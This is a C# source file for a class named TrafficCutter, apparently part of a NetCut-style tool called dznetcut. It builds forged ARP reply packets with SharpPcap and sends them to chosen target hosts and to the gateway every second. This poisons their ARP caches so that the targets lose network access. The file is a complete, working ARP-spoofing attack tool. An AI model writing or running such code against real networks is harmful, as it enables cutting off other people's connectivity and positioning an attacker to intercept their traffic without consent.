using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace dznetcut.Logic
{
    public class TrafficCutter
    {
        private readonly Action<string> _log;
        private readonly object _sendSync = new object();
        private readonly object _sync = new object();
        private int _activeTargetCount;
        private CancellationTokenSource? _trafficCutCts;
        private List<Task> _trafficCutTasks = new List<Task>();
        public TrafficCutter(Action<string>? log = null)
        {
            _log = log ?? (msg => Debug.Print(msg));
        }

        public event Action<bool>? TrafficCutStateChanged;

        public bool IsTrafficCutActive {
            get {
                lock (_sync)
                {
                    return _trafficCutCts != null
                        && !_trafficCutCts.IsCancellationRequested
                        && _trafficCutTasks.Exists(task => !task.IsCompleted);
                }
            }
        }
        public void Start(
            IReadOnlyDictionary<IPAddress, PhysicalAddress> targets,
            IPAddress gatewayIpAddress,
            PhysicalAddress gatewayMacAddress,
            LibPcapLiveDevice networkAdapter)
        {
            StopAll();

            if (targets == null || targets.Count == 0)
            {
                _log("Traffic-cut task skipped because there are no targets.");
                return;
            }

            CancellationTokenSource trafficCutCts;
            lock (_sync)
            {
                _trafficCutCts = new CancellationTokenSource();
                _activeTargetCount = targets.Count;
                trafficCutCts = _trafficCutCts;
            }

            TrafficCutStateChanged?.Invoke(true);

            if (!networkAdapter.Opened)
            {
                networkAdapter.Open();
            }

            if (networkAdapter.MacAddress == null)
            {
                _log("Traffic-cut task skipped because adapter MAC address is unavailable.");
                lock (_sync)
                {
                    _trafficCutCts?.Dispose();
                    _trafficCutCts = null;
                    _activeTargetCount = 0;
                }
                TrafficCutStateChanged?.Invoke(false);
                return;
            }

            _log($"Traffic-cut task started for {_activeTargetCount} target(s).");

            var tasks = new List<Task>();
            foreach (var target in targets)
            {
                var spoofTask = Task.Run(
                    () => SendTrafficCutPacket(target.Key, target.Value, gatewayIpAddress, gatewayMacAddress, networkAdapter, trafficCutCts.Token),
                    trafficCutCts.Token);
                tasks.Add(spoofTask);
            }

            lock (_sync)
            {
                _trafficCutTasks = tasks;
            }
        }

        public void StopAll()
        {
            CancellationTokenSource? ctsToCancel;
            Task[] tasksToWait;
            lock (_sync)
            {
                if (_trafficCutCts == null || _trafficCutCts.IsCancellationRequested)
                {
                    return;
                }

                ctsToCancel = _trafficCutCts;
                tasksToWait = _trafficCutTasks.ToArray();
            }

            ctsToCancel.Cancel();
            try
            {
                if (tasksToWait.Length > 0)
                {
                    Task.WaitAll(tasksToWait, TimeSpan.FromSeconds(2));
                }
            }
            catch (AggregateException)
            {
            }

            lock (_sync)
            {
                _trafficCutTasks = new List<Task>();
                _trafficCutCts?.Dispose();
                _trafficCutCts = null;
            }

            _log($"Traffic-cut task stopped for {_activeTargetCount} target(s).");
            _activeTargetCount = 0;
            TrafficCutStateChanged?.Invoke(false);
        }

        private static EthernetPacket BuildPoisonReplyPacket(
            PhysicalAddress senderMacAddress,
            PhysicalAddress destinationMacAddress,
            IPAddress spoofedProtocolAddress,
            IPAddress destinationProtocolAddress)
        {
            var arpReply = new ArpPacket(
                ArpOperation.Response,
                destinationMacAddress,
                destinationProtocolAddress,
                senderMacAddress,
                spoofedProtocolAddress);
            return new EthernetPacket(senderMacAddress, destinationMacAddress, EthernetType.Arp)
            {
                PayloadPacket = arpReply
            };
        }

        private async Task SendTrafficCutPacket(
                    IPAddress ipAddress,
            PhysicalAddress physicalAddress,
            IPAddress gatewayIpAddress,
            PhysicalAddress gatewayMacAddress,
            LibPcapLiveDevice captureDevice,
            CancellationToken cancellationToken)
        {
            _log($"Cutting traffic for target {physicalAddress.ToString("-")} @ {ipAddress}");

            if (captureDevice.MacAddress == null)
            {
                _log($"Adapter MAC address unavailable; skipping traffic-cut thread for {ipAddress}");
                return;
            }

            var packetToTarget = BuildPoisonReplyPacket(
                senderMacAddress: captureDevice.MacAddress,
                destinationMacAddress: physicalAddress,
                spoofedProtocolAddress: gatewayIpAddress,
                destinationProtocolAddress: ipAddress);
            var packetToGateway = BuildPoisonReplyPacket(
                senderMacAddress: captureDevice.MacAddress,
                destinationMacAddress: gatewayMacAddress,
                spoofedProtocolAddress: ipAddress,
                destinationProtocolAddress: gatewayIpAddress);

            try
            {
                while (!cancellationToken.IsCancellationRequested)
                {
                    lock (_sendSync)
                    {
                        captureDevice.SendPacket(packetToTarget);
                        captureDevice.SendPacket(packetToGateway);
                    }
                    await Task.Delay(TimeSpan.FromSeconds(1), cancellationToken).ConfigureAwait(false);
                }
            }
            catch (OperationCanceledException)
            {
            }
            catch (PcapException ex)
            {
                _log($"PcapException @ TrafficCutter.SendTrafficCutPacket() while cutting traffic [{ex.Message}]");
            }

            _log($"Traffic-cut thread terminating for {physicalAddress.ToString("-")} @ {ipAddress}");
        }
    }
}
